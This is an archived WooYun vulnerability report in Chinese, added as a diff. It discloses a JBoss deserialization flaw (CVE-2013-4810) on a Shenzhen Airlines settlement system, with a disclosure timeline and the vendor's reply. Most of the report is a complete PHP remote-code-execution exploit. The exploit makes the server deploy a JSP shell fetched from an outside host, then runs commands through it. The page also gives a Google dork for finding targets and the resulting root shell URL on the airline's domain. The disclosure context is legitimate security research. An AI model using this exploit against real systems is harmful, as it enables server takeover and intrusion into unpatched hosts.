@@ -1,0 +1,350 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		深圳航空某重要系统中间件漏洞导致shell  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		深圳航空某重要系统中间件漏洞导致shell  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/小胖子">小胖子</a> 
+</li><li>提交时间：		2013-10-18 11:59</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-18：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-18：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-10-28：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-07：	细节向普通白帽子公开<br/>
+									2013-11-17：	细节向实习白帽子公开<br/>
+									2013-12-02：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">CVE: 2013-4810，踏破铁鞋无觅处，得来全不费工夫！哈哈</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">重要系统：航空结算系统！<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://rf.shenzhenair.com/</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+利用最新的Jboss的CVE: 2013-4810漏洞，getshell。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?php<br />
+/*<br />
+Apache Tomcat/JBoss EJBInvokerServlet / JMXInvokerServlet (RMI over HTTP) Marshalled Object <br />
+Remote Code Execution<br />
+ <br />
+google dork: inurl:status EJBInvokerServlet <br />
+ <br />
+this was used successfully on Windows during a penetration test against<br />
+McAfee Web Reporter 5.2.1 (tcp port 9111/http) gaining administrative privileges<br />
+see: http://www.mcafee.com/it/downloads/downloads.aspx<br />
+file tested: webreporter64bit.zip<br />
+ <br />
+Usage:<br />
+C:\PHP&gt;php 9sg_ejb.php 192.168.0.1 id<br />
+ <br />
+HTTP/1.1 200 OK<br />
+Server: Apache-Coyote/1.1<br />
+X-Powered-By: Servlet 2.4; JBoss-4.0.5.GA (build: CVSTag=Branch_4_0 date=2006101<br />
+62339)/Tomcat-5.5<br />
+Set-Cookie: JSESSIONID=E9EEE1D6AD27D64ED3835C1092C4FC29; Path=/<br />
+Content-Type: text/html;charset=ISO-8859-1<br />
+Content-Length: 43<br />
+Date: Fri, 04 Oct 2013 07:25:48 GMT<br />
+Connection: close<br />
+ <br />
+ <br />
+uid=0(root) gid=0(root) groups=0(root)<br />
+ <br />
+C:\PHP&gt;<br />
+ <br />
+~ rgod ~<br />
+*/<br />
+ <br />
+$host=$argv[1];<br />
+$cmd=$argv[2];<br />
+//$port=9111; //mcafee<br />
+$port=80;<br />
+ <br />
+//small jsp shell<br />
+//change this if you want, url to the app to be deployed, keep it short<br />
+$url=&quot;http://retrogod.altervista.org/a.war?&quot;; <br />
+ <br />
+ <br />
+$url_len=pack(&quot;n&quot;,strlen($url));<br />
+ <br />
+function hex_dump($data, $newline=&quot;\n&quot;) { <br />
+static $from = &#039;&#039;;   <br />
+static $to = &#039;&#039;;    <br />
+static $width = 16; static $pad = &#039;.&#039;;  <br />
+ if ($from===&#039;&#039;)   {     <br />
+     for ($i=0; $i&lt;=0xFF; $i++)  { <br />
+         $from .= chr($i);       <br />
+         $to .= ($i &gt;= 0x20 &amp;&amp; $i &lt;= 0x7E) ? chr($i) : $pad;   <br />
+     }   <br />
+ }    <br />
+$hex = str_split(bin2hex($data), $width*2);   <br />
+$chars = str_split(strtr($data, $from, $to), $width);    <br />
+$offset = 0;   <br />
+foreach ($hex as $i =&gt; $line)   {     <br />
+    echo sprintf(&#039;%6X&#039;,$offset).&#039; : &#039;.implode(&#039; &#039;, str_split($line,2)) . &#039; [&#039; . $chars[$i] . &#039;]&#039; . $newline;    <br />
+   $offset += $width;   <br />
+  } <br />
+} <br />
+ <br />
+$frag_i=<br />
+&quot;\xac\xed\x00\x05\x73\x72\x00\x29\x6f\x72\x67\x2e\x6a\x62\x6f\x73&quot;. // ....sr.) org.jbos<br />
+&quot;\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d\x61\x72&quot;. // s.invoca tion.Mar<br />
+&quot;\x73\x68\x61\x6c\x6c\x65\x64\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f&quot;. // shalledI nvocatio<br />
+&quot;\x6e\xf6\x06\x95\x27\x41\x3e\xa4\xbe\x0c\x00\x00\x78\x70\x70\x77&quot;. // n...&#039;A&gt;. ....xppw<br />
+&quot;\x08\x78\x94\x98\x47\xc1\xd0\x53\x87\x73\x72\x00\x11\x6a\x61\x76&quot;. // .x..G..S .sr..jav<br />
+&quot;\x61\x2e\x6c\x61\x6e\x67\x2e\x49\x6e\x74\x65\x67\x65\x72\x12\xe2&quot;. // a.lang.I nteger..<br />
+&quot;\xa0\xa4\xf7\x81\x87\x38\x02\x00\x01\x49\x00\x05\x76\x61\x6c\x75&quot;. // .....8.. .I..valu<br />
+&quot;\x65\x78\x72\x00\x10\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x4e&quot;. // exr..jav a.lang.N<br />
+&quot;\x75\x6d\x62\x65\x72\x86\xac\x95\x1d\x0b\x94\xe0\x8b\x02\x00\x00&quot;. // umber... ........<br />
+&quot;\x78\x70\x26\x95\xbe\x0a\x73\x72\x00\x24\x6f\x72\x67\x2e\x6a\x62&quot;. // xp&amp;...sr .$org.jb<br />
+&quot;\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x4d&quot;. // oss.invo cation.M<br />
+&quot;\x61\x72\x73\x68\x61\x6c\x6c\x65\x64\x56\x61\x6c\x75\x65\xea\xcc&quot;. // arshalle dValue..<br />
+&quot;\xe0\xd1\xf4\x4a\xd0\x99\x0c\x00\x00\x78\x70\x77&quot;;<br />
+ <br />
+$frag_ii=&quot;\x00&quot;;<br />
+ <br />
+$frag_iii=<br />
+&quot;\xac\xed\x00\x05\x75\x72\x00\x13\x5b\x4c\x6a\x61\x76\x61\x2e&quot;.     // .....ur. .[Ljava.<br />
+&quot;\x6c\x61\x6e\x67\x2e\x4f\x62\x6a\x65\x63\x74\x3b\x90\xce\x58\x9f&quot;. // lang.Obj ect;..X.<br />
+&quot;\x10\x73\x29\x6c\x02\x00\x00\x78\x70\x00\x00\x00\x04\x73\x72\x00&quot;. // .s)l...x p....sr.<br />
+&quot;\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d\x65\x6e&quot;. // .javax.m anagemen<br />
+&quot;\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03\xa7\x1b&quot;. // t.Object Name....<br />
+&quot;\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x21\x6a\x62\x6f\x73&quot;. // .m.....x pt.!jbos<br />
+&quot;\x73\x2e\x73\x79\x73\x74\x65\x6d\x3a\x73\x65\x72\x76\x69\x63\x65&quot;. // s.system :service<br />
+&quot;\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f\x79\x65\x72\x78\x74\x00&quot;. // =MainDep loyerxt.<br />
+&quot;\x06\x64\x65\x70\x6c\x6f\x79\x75\x71\x00\x7e\x00\x00\x00\x00\x00&quot;. // .deployu q.~.....<br />
+&quot;\x01\x74&quot;.<br />
+$url_len.<br />
+$url.<br />
+&quot;\x75\x72\x00&quot;.<br />
+&quot;\x13\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61&quot;.                         // ur..[ Ljava.la<br />
+&quot;\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67\x3b\xad\xd2\x56\xe7\xe9\x1d&quot;. // ng.Strin g;..V...<br />
+&quot;\x7b\x47\x02\x00\x00\x78\x70\x00\x00\x00\x01\x74\x00\x10\x6a\x61&quot;. // {G...xp. ...t..ja<br />
+&quot;\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x72\x69\x6e\x67&quot;;<br />
+ <br />
+$frag_iv=<br />
+&quot;\x0d\xd3&quot;. <br />
+&quot;\xbe\xc9\x78\x77\x04\x00\x00\x00\x01\x73\x72\x00\x22\x6f\x72\x67&quot;. // ..xw.... .sr.&quot;org<br />
+&quot;\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e\x76\x6f\x63\x61\x74\x69\x6f&quot;. // .jboss.i nvocatio<br />
+&quot;\x6e\x2e\x49\x6e\x76\x6f\x63\x61\x74\x69\x6f\x6e\x4b\x65\x79\xb8&quot;. // n.Invoca tionKey.<br />
+&quot;\xfb\x72\x84\xd7\x93\x85\xf9\x02\x00\x01\x49\x00\x07\x6f\x72\x64&quot;. // .r...... ..I..ord<br />
+&quot;\x69\x6e\x61\x6c\x78\x70\x00\x00\x00\x05\x73\x71\x00\x7e\x00\x05&quot;. // inalxp.. ..sq.~..<br />
+&quot;\x77\x0d\x00\x00\x00\x05\xac\xed\x00\x05\x70\xfb\x57\xa7\xaa\x78&quot;. // w....... ..p.W..x<br />
+&quot;\x77\x04\x00\x00\x00\x03\x73\x71\x00\x7e\x00\x07\x00\x00\x00\x04&quot;. // w.....sq .~......<br />
+&quot;\x73\x72\x00\x23\x6f\x72\x67\x2e\x6a\x62\x6f\x73\x73\x2e\x69\x6e&quot;. // sr.#org. jboss.in<br />
+&quot;\x76\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x49\x6e\x76\x6f\x63\x61\x74&quot;. // vocation .Invocat<br />
+&quot;\x69\x6f\x6e\x54\x79\x70\x65\x59\xa7\x3a\x1c\xa5\x2b\x7c\xbf\x02&quot;. // ionTypeY .:..+|..<br />
+&quot;\x00\x01\x49\x00\x07\x6f\x72\x64\x69\x6e\x61\x6c\x78\x70\x00\x00&quot;. // ..I..ord inalxp..<br />
+&quot;\x00\x01\x73\x71\x00\x7e\x00\x07\x00\x00\x00\x0a\x70\x74\x00\x0f&quot;. // ..sq.~.. ....pt..<br />
+&quot;\x4a\x4d\x58\x5f\x4f\x42\x4a\x45\x43\x54\x5f\x4e\x41\x4d\x45\x73&quot;. // JMX_OBJE CT_NAMEs<br />
+&quot;\x72\x00\x1b\x6a\x61\x76\x61\x78\x2e\x6d\x61\x6e\x61\x67\x65\x6d&quot;. // r..javax .managem<br />
+&quot;\x65\x6e\x74\x2e\x4f\x62\x6a\x65\x63\x74\x4e\x61\x6d\x65\x0f\x03&quot;. // ent.Obje ctName..<br />
+&quot;\xa7\x1b\xeb\x6d\x15\xcf\x03\x00\x00\x78\x70\x74\x00\x21\x6a\x62&quot;. // ...m.... .xpt.!jb<br />
+&quot;\x6f\x73\x73\x2e\x73\x79\x73\x74\x65\x6d\x3a\x73\x65\x72\x76\x69&quot;. // oss.syst em:servi<br />
+&quot;\x63\x65\x3d\x4d\x61\x69\x6e\x44\x65\x70\x6c\x6f\x79\x65\x72\x78&quot;. // ce=MainD eployerx<br />
+&quot;\x78&quot;;                                                             // x<br />
+ <br />
+$data=$frag_i.pack(&quot;v&quot;,strlen($frag_iii)+8).$frag_ii.pack(&quot;n&quot;,strlen($frag_iii)).$frag_iii.$frag_iv;<br />
+ <br />
+//$pk=&quot;&quot;POST /invoker/JMXInvokerServlet/ HTTP/1.1\r\n&quot;. //the same ...<br />
+ <br />
+$pk=&quot;POST /invoker/EJBInvokerServlet/ HTTP/1.1\r\n&quot;.<br />
+    &quot;ContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation\r\n&quot;.<br />
+    &quot;Accept-Encoding: x-gzip,x-deflate,gzip,deflate\r\n&quot;.<br />
+    &quot;User-Agent: Java/1.6.0_21\r\n&quot;.<br />
+    &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.<br />
+    &quot;Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n&quot;.<br />
+    &quot;Connection: keep-alive\r\n&quot;.<br />
+    &quot;Content-type: application/x-www-form-urlencoded\r\n&quot;.<br />
+    &quot;Content-Length: &quot;.strlen($data).&quot;\r\n\r\n&quot;.<br />
+    $data;<br />
+echo hex_dump($pk).&quot;\n&quot;;<br />
+$fp=fsockopen($host,$port,$e,$err,3);<br />
+fputs($fp,$pk);<br />
+$out=fread($fp,8192);<br />
+fclose($fp);<br />
+echo hex_dump($out).&quot;\n&quot;;<br />
+ <br />
+sleep(5);<br />
+ <br />
+$pk=&quot;GET /a/pwn.jsp?cmd=&quot;.urlencode($cmd).&quot; HTTP/1.0\r\n&quot;.<br />
+    &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.<br />
+    &quot;Connection: Close\r\n\r\n&quot;;<br />
+ <br />
+echo hex_dump($pk).&quot;\n&quot;;<br />
+$fp=fsockopen($host,$port,$e,$err,3);<br />
+fputs($fp,$pk);<br />
+$out=&quot;&quot;;<br />
+while (!feof($fp)) {<br />
+$out.=fread($fp,8192);<br />
+}<br />
+fclose($fp);<br />
+echo $out;<br />
+?&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+得到的shell地址，root权限，我就只看了个权限，你们这个系统比较高贵，不敢乱来！<br />
+<br />
+<br />
+<br />
+http://rf.shenzhenair.com/a/pwn.jsp?cmd=whoami<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">0x1：升级jboss。<br />
+<br />
+0x2：求20rank！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/小胖子" title="小胖子">小胖子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-040159" title="深圳航空某重要系统中间件漏洞导致shell">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-10-18 14:02</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对深航信息系统的关注和帮助，我们将尽快排查程序修补漏洞。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="40159";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
